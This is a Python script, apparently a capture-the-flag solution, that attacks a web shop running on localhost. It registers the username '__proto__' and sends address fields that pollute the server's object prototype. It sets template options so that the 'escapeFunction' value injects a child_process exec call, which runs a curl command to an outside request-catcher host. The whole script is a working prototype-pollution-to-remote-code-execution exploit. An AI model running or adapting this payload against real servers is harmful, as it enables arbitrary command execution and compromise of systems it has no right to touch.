import requests

base_url = 'http://localhost:3000'
session = requests.Session()

def register(username, password):
    url = f'{base_url}/register'
    data = {
        'username': username,
        'password': password
    }
    response = session.post(url, data=data)
    if 'address' in response.url:
        print(f"Registered successfully as {username}")
        return True
    else:
        print(f"Failed to register: {response.text}")
        return False

def add_address(username, addressId, fullAddress):
    url = f'{base_url}/address'
    data = {
        'username': username,
        'addressId': addressId,
        'Fulladdress': fullAddress
    }
    response = session.post(url, data=data)
    if 'login' in response.url:
        print(f"Address added successfully for {username}")
        return True
    else:
        print(f"Failed to add address: {response.text}")
        return False

def login(username, password):
    url = f'{base_url}/login'
    data = {
        'username': username,
        'password': password
    }
    response = session.post(url, data=data)
    if 'login' not in response.url:
        print(f"Logged in as {username}")
        return True
    else:
        print(f"Failed to log in: {response.text}")
        return False

def place_order(item, quantity):
    url = f'{base_url}/order'
    data = {
        'item': item,
        'quantity': quantity
    }
    response = session.post(url, data=data)
    if 'order' not in response.url:
        print("Order placed successfully")
        return True
    else:
        print(f"Failed to place order: {response.text}")
        return False

def view_admin_orders():
    url = f'{base_url}/admin'
    response = session.get(url)
    if response.status_code == 200:
        print("Admin Orders:")
        print(response.text)
    else:
        print("Failed to retrieve orders or unauthorized access")

if __name__ == '__main__':
    register("__proto__", "random")
    add_address("__proto__", "client", "1")
    cmd = "curl https://dragon.requestcatcher.com/hacked"
    add_address("__proto__", "escapeFunction", "JSON.stringify; process.mainModule.require('child_process').exec('" + cmd + "')")

    view_admin_orders()